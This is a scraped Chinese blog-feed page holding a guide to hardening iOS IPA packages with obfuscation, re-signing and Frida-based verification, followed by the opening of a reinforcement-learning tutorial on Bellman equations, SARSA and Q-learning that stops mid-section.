#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 iOS 项目的安全体系中，“如何提高 IPA 的安全性”常常被误解为“找一个加固工具处理一下”。
但从工程角度来看，IPA 的安全性属于<strong>整体链路问题</strong>：
涉及构建、符号、资源、运行时、签名、逆向对抗、以及线上治理等多个环节。</p>
<p>想真正提升 IPA 的安全性，需要从“单点防护”升级为“多层安全策略 + 多工具联动 + 可回滚的工程体系”。</p>
<p>本文基于实际工程团队经验，总结一套可落地、可复制、可维护的 IPA 安全方案。</p>
<hr/>
<h2 data-id="heading-0">一、什么是 IPA 安全性？</h2>
<p>IPA 安全性可以拆解为六类目标：</p>
<h3 data-id="heading-1"><strong>1. 代码安全（防逆向、降低符号可读性）</strong></h3>
<ul>
<li>方法名、类名、变量名可被逆向工具轻松识别</li>
<li>Swift/ObjC 符号泄漏结构信息</li>
</ul>
<h3 data-id="heading-2"><strong>2. 资源安全（防替换、防注入、防二次打包）</strong></h3>
<ul>
<li>图片、JS、JSON 等可直接替换</li>
<li>H5 混合应用容易被篡改</li>
</ul>
<h3 data-id="heading-3"><strong>3. 完整性安全（防伪造、重签、二次分发）</strong></h3>
<h3 data-id="heading-4"><strong>4. 动态对抗（提高 Hook 难度）</strong></h3>
<h3 data-id="heading-5"><strong>5. 线上可维护性（崩溃可符号化、可回滚）</strong></h3>
<h3 data-id="heading-6"><strong>6. 自动化能力（可集成 CI/CD）</strong></h3>
<p>这些能力必须通过工具组合才能实现。</p>
<hr/>
<h2 data-id="heading-7">二、IPA 安全提升所需的工具体系</h2>
<p>一个完整的方案需要如下工具协作：</p>








































<table><thead><tr><th>工具类型</th><th>代表工具</th><th>作用</th></tr></thead><tbody><tr><td>静态分析</td><td>MobSF、class-dump</td><td>发现风险面、确定白名单</td></tr><tr><td>成品混淆（核心）</td><td><strong>Ipa Guard CLI</strong></td><td>无需源码对 IPA 混淆、资源扰动</td></tr><tr><td>资源保护</td><td>Ipa Guard 资源模式</td><td>修改 MD5、重命名 H5/JS/图片</td></tr><tr><td>重签验证</td><td>kxsign</td><td>混淆后签名、安装、测试</td></tr><tr><td>逆向验证</td><td>Frida、Hopper</td><td>测试混淆效果、验证阻力</td></tr><tr><td>映射治理</td><td>KMS、Sentry/Bugly</td><td>管理符号映射、保障可回滚</td></tr></tbody></table>
<p>下面进入实际流程部分。</p>
<hr/>
<h2 data-id="heading-8">三、提高 IPA 安全性的完整工程流程（可直接复用）</h2>
<h2 data-id="heading-9"><strong>步骤 1：使用 MobSF + class-dump 做静态扫描</strong></h2>
<p>目的：</p>
<ul>
<li>找到暴露的 Swift/ObjC 符号</li>
<li>分析 H5、JS、JSON 等资源依赖</li>
<li>明确 Storyboard、反射调用、桥接 API 等白名单</li>
<li>初步判断风险面</li>
</ul>
<p>示例：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">class</span>-dump app.ipa &gt; symbols.txt
</code></pre>
<p>生成的数据是后续混淆必需的依据。</p>
<hr/>
<h2 data-id="heading-10"><strong>步骤 2（可选）：对源码做基础混淆（如有权限）</strong></h2>
<p>如果你有源码（不是每个团队都有），可以使用：</p>
<ul>
<li>Swift Shield（重命名 Swift 类/属性/方法）</li>
<li>obfuscator-llvm（控制流混淆、字符串保护）</li>
<li>自定义脚本（常量扰动）</li>
</ul>
<p>但这不是必须，<strong>无源码项目可以直接进入下一步</strong>。</p>
<hr/>
<h2 data-id="heading-11"><strong>步骤 3：使用 Ipa Guard 导出可混淆符号（无需源码）</strong></h2>
<p>Ipa Guard 是提升 IPA 安全性的核心工具，因为它专注于处理“成品 IPA”，不依赖源码。</p>
<pre><code class="hljs">ipaguard_cli parse app.ipa -o sym.json
</code></pre>
<p><code>sym.json</code> 包含关键字段：</p>
<ul>
<li><code>confuse</code>（是否混淆）</li>
<li><code>refactorName</code>（替换后的名字）</li>
<li><code>fileReferences</code>（引用文件）</li>
<li><code>stringReferences</code>（字符串依赖）</li>
</ul>
<p>这是整个流程的“策略文件”。</p>
<hr/>
<h2 data-id="heading-12"><strong>步骤 4：编辑混淆策略（极重要）</strong></h2>
<p>必须排除不能动的内容：</p>
<ul>
<li>Storyboard ID</li>
<li>反射方法</li>
<li>H5/JS 的桥接方法</li>
<li>Flutter/React Native 的通信符号</li>
<li>SDK 初始化方法</li>
</ul>
<p>确保：</p>
<ul>
<li><code>refactorName</code> 长度不变</li>
<li>关键符号使用 <code>confuse:false</code></li>
<li>业务可混淆符号尽量开启</li>
</ul>
<p>这是控制稳定性与安全性之间平衡的核心。</p>
<hr/>
<h2 data-id="heading-13"><strong>步骤 5：执行 IPA 混淆与资源加固（关键步骤）</strong></h2>
<pre><code class="hljs language-css" lang="css">ipaguard_cli protect app<span class="hljs-selector-class">.ipa</span> -c sym<span class="hljs-selector-class">.json</span> <span class="hljs-attr">--email</span> team<span class="hljs-keyword">@dev</span>.com --image --js -o secured.ipa
</code></pre>
<p>完成：</p>
<p>✔ 类名、方法名、变量名混淆
✔ 资源文件重命名
✔ 图片 MD5 修改（防资源替换）
✔ JS/H5 路径混淆（Hybrid 必备）
✔ 输出混淆映射（后续符号化与回滚依赖）</p>
<p>这是提升 IPA 安全性的核心步骤。</p>
<hr/>
<h2 data-id="heading-14"><strong>步骤 6：重签名并进行真机测试</strong></h2>
<p>混淆后的 IPA 必须重签，否则无法打开。</p>
<pre><code class="hljs language-css" lang="css">kxsign sign secured<span class="hljs-selector-class">.ipa</span> -c dev_cert<span class="hljs-selector-class">.p12</span> -<span class="hljs-selector-tag">p</span> pwd \
  -m dev<span class="hljs-selector-class">.mobileprovision</span> -z signed<span class="hljs-selector-class">.ipa</span> -<span class="hljs-selector-tag">i</span>
</code></pre>
<p>测试重点：</p>
<ul>
<li>冷启动</li>
<li>全业务链路</li>
<li>WebView/H5</li>
<li>Flutter/RN 资源加载</li>
<li>SDK 初始化（支付、推送等）</li>
</ul>
<hr/>
<h2 data-id="heading-15"><strong>步骤 7：逆向难度验证（确认加固是否有效）</strong></h2>
<h3 data-id="heading-16">Frida</h3>
<pre><code class="hljs language-css" lang="css">frida -U -f com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.app</span> <span class="hljs-attr">--no-pause</span> -l hook_test<span class="hljs-selector-class">.js</span>
</code></pre>
<p>检查：</p>
<ul>
<li>关键方法是否难 Hook</li>
<li>符号名是否已不再可读</li>
<li>是否能轻易定位业务逻辑</li>
</ul>
<h3 data-id="heading-17">Hopper / IDA</h3>
<p>检查：</p>
<ul>
<li>结构是否复杂化</li>
<li>符号是否已乱码</li>
<li>函数跳转是否变得不直观</li>
</ul>
<p>这一步决定加密效果是否达标。</p>
<hr/>
<h2 data-id="heading-18"><strong>步骤 8：映射表治理（确保可维护、可回滚）</strong></h2>
<p>推荐使用 KMS/HSM 或 Git 加密仓库存放：</p>
<ul>
<li>混淆映射表</li>
<li>sym.json（最终策略）</li>
<li>签名指纹</li>
<li>构建号</li>
</ul>
<p>作用：</p>
<ul>
<li>崩溃日志可符号化</li>
<li>出现问题可快速回滚</li>
<li>策略可审计与版本化</li>
</ul>
<hr/>
<h2 data-id="heading-19">四、IPA 安全性常见失败原因与解决方式</h2>



































<table><thead><tr><th>问题</th><th>原因</th><th>解决办法</th></tr></thead><tbody><tr><td>App 白屏</td><td>UI/Storyboard 符号被误混淆</td><td>白名单必须明确处理</td></tr><tr><td>JS/H5 失效</td><td>路径被改但未同步引用</td><td><code>--js</code> 模式或手动同步</td></tr><tr><td>SDK 初始化崩溃</td><td>SDK 方法被误混淆</td><td>SDK 入口方法必须禁混淆</td></tr><tr><td>崩溃无法定位</td><td>混淆映射丢失</td><td>必须纳入治理体系</td></tr><tr><td>可逆向程度仍高</td><td>符号未完全混淆</td><td>检查 sym.json 策略覆盖度</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-20">提高 IPA 安全性靠体系，而不是某一个工具</h2>
<p>最佳实践是多工具协同：</p>
<h3 data-id="heading-21"><strong>分析层</strong></h3>
<p>MobSF
class-dump</p>
<h3 data-id="heading-22"><strong>混淆层（核心）</strong></h3>
<p>Ipa Guard CLI（IPA 成品层加固）</p>
<h3 data-id="heading-23"><strong>测试层</strong></h3>
<p>kxsign
真机验收</p>
<h3 data-id="heading-24"><strong>逆向验证层</strong></h3>
<p>Frida
Hopper</p>
<h3 data-id="heading-25"><strong>治理层</strong></h3>
<p>KMS
Sentry/Bugly
Git</p>
<p>一个 IPA 的安全性不是加固工具做出来的，而是整个团队通过工具链、流程和策略共同构建的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[「干货长文」强化学习完全指南：从基础MDP到TRPO/PPO/GRPO算法演进]]></title>    <link>https://juejin.cn/post/7574727105704869928</link>    <guid>https://juejin.cn/post/7574727105704869928</guid>    <pubDate>2025-11-21T05:53:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574727105704869928" data-draft-id="7574728397374357556" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="「干货长文」强化学习完全指南：从基础MDP到TRPO/PPO/GRPO算法演进"/> <meta itemprop="keywords" content="强化学习"/> <meta itemprop="datePublished" content="2025-11-21T05:53:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="智见AGI"/> <meta itemprop="url" content="https://juejin.cn/user/4145611877132986"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            「干货长文」强化学习完全指南：从基础MDP到TRPO/PPO/GRPO算法演进
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4145611877132986/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    智见AGI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:53:18.000Z" title="Fri Nov 21 2025 05:53:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>随着 gpt-o1出现以及 DeepSeek-R1 的技术开源，强化学习从以谷歌 DeepMind 团队为主的游戏领域，以及与传统控制相结合的具身智能机器人领域，走上了LLM甚至多模态的行业赛道。通过复杂任务拆解和奖励为导向的迭代训练大幅提升了大模型解决复杂问题能力，泛化性以及动态调整能力。Reinforce Learning 带领 LLM 步入 2.0 时代，继 PPO 之后，最近关于梯度优化（Policy Optimization）算法的创新也是层出不穷，GRPO，DAPO，CISPO 等 但是复杂的数学公式及其底层原理，却让人望而却步；因为强化学习是非常系统性的技术，是从最开始的马尔可夫决策过程 (MDP)，贝尔曼方程，通过其数学性质，使用映射压缩定理逐渐演变而来 所以想深刻了解 LLM 中各种变种策略梯度算法的作用与本质，我们需要先了解强化学习的基础，接下来就让我一步一步捋清其来龙去脉</p>
<p>强化学习有两个很重要的性质：一阶马尔可夫性和不动点定理 这两点是整个强化学习框架的基石，缺一不可</p>
<p><strong>Infrastructure</strong></p>
<ol>
<li><strong>Foundation</strong></li>
</ol>
<p>强化学习的目标是寻找最优策略解决问题 于是把智能体 agent 解决实际问题的过程，抽象成马尔可夫决策过程 MDP 该过程具有一阶马尔可夫性：</p>
<p>P(st+1|st,st−1,...,s1)=P(st+1|st)</p>
<p>也就是序列 t+1 的状态只与 t 有关（简化模型，减少计算量）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/829a2aeca5f240c99011a17222ec04bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=cNEShRECsGrp%2B5eyoZw5UWP%2FR3I%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f1662c5114b4055866353d207bd8648~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=HcpStbEt3L17serX6KFWixpgAro%3D" alt="" loading="lazy"/></p>
<p>该系统具有五个变量（策略Policy，状态state，行为action，环境environment，奖励reward） 目标转化成在特定环境中，选择最优策略，在不同状态下执行最优行动，从而获得最大奖励，完成任务</p>
<p>奖励信号：短期收益 价值函数：长期收益，更有远见的判断</p>
<p>通过这种系统的构建形式，我们可以在尽可能短期获得奖励达成目标的同时，又具有一定的前瞻性，通过 Exploration 有一定概率得到更优解</p>
<p>2.<strong>贝尔曼方程</strong></p>
<p><strong>2.1 Bellman Expectation Equation</strong></p>
<p>要具有更高时效性，在更短时间内完成任务，于是引入折扣因子γ，引出了强化学习核心数学工具 贝尔曼公式 该公式描述了 给定策略</p>
<p>π下，状态价值函数</p>
<p>Vπ(s)和 动作价值函数</p>
<p>Qπ(s,a)的递归关系</p>
<p>Vπ(s)=∑aπ(a∣s)Qπ(s,a)=∑aπ(a∣s)∑s′P(s′∣s,a)[r+γVπ(s′)]Qπ(s,a)=∑s′P(s′∣s,a)[r+v(s′)]=∑s′P(s′∣s,a)[r+γ∑a′π(a′∣s′)Qπ(s′,a′)]</p>
<p><strong>2.2 Bellman Optimal Equation</strong></p>
<p>我们的目标是找到最优策略</p>
<p>π∗，使得价值函数值最大，引出了贝尔曼最优公式</p>
<p>V∗(s)=maxa∑s′P(s′∣s,a)[r+γV∗(s′)]Q∗(s,a)=∑s′P(s′∣s,a)[r+γmaxa′Q∗(s′,a′)]</p>
<p>矩阵形式下等价于求</p>
<p>v=maxπrπ+γPπv</p>
<p>因为折扣因子γ&lt;1，</p>
<p>f(v)=maxπrπ+γPπv=v</p>
<p>符合压缩映射定理 contract mapping theory</p>
<p>|f(v1)−f(v2)|&lt;γ|v1−v2|</p>
<p>可以通过迭代法</p>
<p>vk+1=f(vk)</p>
<p>求解，最终会收敛于唯一解</p>
<p>v∗和 得到 最优策略</p>
<p>π∗（</p>
<p>π∗不一定唯一） 最终</p>
<p>v∗=f(v∗)</p>
<p>得到贝尔曼最优公式</p>
<p><strong>Value-based method</strong></p>
<p><strong>3.Dynamic Proramming</strong></p>
<p>在完全已知环境中（已知迷宫），可以通过动态规划的算法（值迭代 和 (截断) 策略迭代） 也是 model-based 的强化学习，求贝尔曼最优方程，得到最优策略π∗</p>
<ul>
<li>策略迭代： Policy evaluation vπk=rπk+γPπkvπk<br/>
根据 r 和 环境的状态转移矩阵 P 迭代逼近真实的 Vπ(s)</li>
</ul>
<p>Policy improvement</p>
<p>vπk+1=\argmaxπ(rπ+γPπvπk)</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/204e3304318e45d99aca084d905cf8e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=9j3O6pROj5kGy2uwRBGFL8Fen8A%3D" alt="" loading="lazy"/></p>
<p>因为映射压缩定律，可以使用自举法，让价值函数</p>
<p>vπ</p>
<p>不断迭代逼近最优解</p>
<p>v∗</p>
<p>，从而得到相对应地最优策略</p>
<p>π∗</p>
<p><strong>4.Monte Carlo</strong></p>
<p>有模型的时候我们可以使用，动态规划方法。但是在无模型的情况下，我们需要采用大数定律，通过蒙特卡罗方法去采样近似其模型</p>
<p>根据 DP 的 策略评估和策略改进可知：</p>
<p>{evaluation:vπk=rπk+γPπkvπkimprovement:πk+1=\argmaxπ(rπ+γPπvπk)</p>
<p>πk+1(a|s)=\argmaxπ∑aπ(a|s)qπk(s,a)</p>
<p>无模型的时候，根据大数定律，用采样频率近似概率，对</p>
<p>qπk(s,a)</p>
<p>做近似</p>
<p>qπk(s,a)=E[Gt|St=s,At=a]≈1N∑i=1Ng(i)(s,a)</p>
<p>∴πk+1(a|s)=\argmaxπ∑aπ(a|s)1N∑i=1Ng(i)(s,a)</p>
<p><strong>5.Temporal Difference</strong></p>
<p>但在大多数实际场景中，环境十分复杂不可知，所以需要agent不断去跟环境做交互，采样数据样本来学习 这类统称 free-model 无模型强化学习，包括基于时序差分 TD 的 Sarsa 和 Q-learning算法，运用蒙特卡洛概率估计的思想，近似值函数</p>
<p>时序差分 TD 结合了 MC 抽样 和 动态规划的自举 MC：</p>
<p>V(st)=V(st)+α(Gt−V(st))=V(st)=V(st)+α(rt+1+γ2rt+2+...+γT−t+2rT−V(st))</p>
<p>一步时序差分：</p>
<p>V(st)=V(st)+α(rt+1+γV(st+1)−V(st))</p>
<p>(一步更新，更新频率更快，延迟更低)</p>
<p>V(st)=α(Rt+1+γV(st+1))+(1−α)V(st)</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d8c46c1fde14d60b7cdca715190af72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=nBaYJtnE5Gv5g6B3041lmkh8gFw%3D" alt="" loading="lazy"/></p>
<p><strong>5.1 SARSA</strong></p>
<p>在线 / 同轨策略 (on-policy) TD，SARSA 算法(s-&gt;a-&gt;r-&gt;s-&gt;a)，与环境交互得到奖励，不断更新 Q 值来优化策略 用一些样本来评估策略，然后更新策略了，策略提升可以在策略未完全评估的情况进行，是广义策略迭代</p>
<p>Q(s,a)=Q(s,a)+α[Rt+1+γQ(s′,a′)−Q(s,a)]</p>
<p>td_error = r + gamma * Q_table[s1, a1] - Q_table[s0, a0] Q_table[s0, a0] += alpha * td_error</p>
<p>SARSA 具体算法如下:</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb289a498e654374990eb7c46a15b4b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=pJv6G2vyGZTSB%2FMxU2ZdY1DUS7o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adbbaf136ece4138881fb6c013a07077~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=f9X2fwBh7HOTBmQIGONoDov8s%2BE%3D" alt="" loading="lazy"/></p>
<p><strong>5.2 多步 SARSA</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0f4accd0146453b945eebb7e24c7c31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=lx6Q6%2BwdRMx50oZ3Umnu%2BC9dx6g%3D" alt="" loading="lazy"/></p>
<p><strong>5.3 Q-learning</strong></p>
<p>与 SARSA 不同，是 离线/离轨策略 (off-policy) TD 控制 在</p>
<p>st</p>
<p>时刻选择目标策略，得到</p>
<p>Qπ(s,a),st+1</p>
<p>， 但是在</p>
<p>st+1</p>
<p>时，执行</p>
<p>at+1</p>
<p>，根据最大 Q 值，选择行动策略</p>
<p>b=argmaxQ(st+1,a)</p>
<p>于是有</p>
<p>Q(s,a)=Q(s,a)+α[Rt+1+γmaxQ(s′,a)−Q(s,a)]</p>
<p>Q 学习在更新 Q 表格的时候所用到的 Q(s′,a′) 对应的动作不一定是下一步会执行的动作，因为下一步实际会执行的动作可能是因为进一步的探索而得到的 Q 学习默认的动作不是通过行为策略来选取的，它默认 a′ 为最佳策略对应的动作，所以 Q 学习算法在更新的时候，不需要传入 a′</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de19410f8eb74658a6a4daf6e60d7d0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=LnI0GtwepFF%2B09QnvfZ%2BEY5IOFw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b772c2cf5764f80b822dd8555753e8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=VF%2F%2FSvXcnj9Yx%2FTTEGwQ7RxhoQQ%3D" alt="" loading="lazy"/></p>
<p><strong>5.4 期望 SARSA</strong></p>
<p>不执行</p>
<p>at+1</p>
<p>，根据 Q-table 计算，使用同轨策略</p>
<p>Eπ[Q(st+1|a)|st+1]=∑aπ(a|st+1)Q(st+1,a)</p>
<p>有</p>
<p>Q(s,a)=Q(s,a)+α[r+γEπ[Q(s′|a)|s′]−Q(s,a)]</p>
<p>对比一下 SARSA</p>
<p>Q(s,a)=Q(s,a)+α[Rt+1+γQ(s′,a′)−Q(s,a)]</p>
<p>td_error = r + self.gamma * self.Q_table[s1, a1] - self.Q_table[s0, a0]</p>
<p>Q-learning</p>
<p>Q(s,a)=Q(s,a)+α[Rt+1+γmaxQ(s′,a)−Q(s,a)]</p>
<p>td_error = r + self.gamma * self.Q_table[s1].max() - self.Q_table[s0, a0]</p>
<p>期望 SARSA</p>
<p>Q(s,a)=Q(s,a)+α[r+γEπ[Q(s′|a)|s′]−Q(s,a)]</p>
<p>Q-learning 是 期望 SARSA 的特例，即</p>
<p>Eπ[Q(s′|a)|s′]=maxQ(s′,a∗)</p>
<p><strong>6.动态规划，蒙特卡洛，时序差分的对比</strong></p>
<p>动态规划直接计算期望，它把所有相关的状态都进行加和</p>
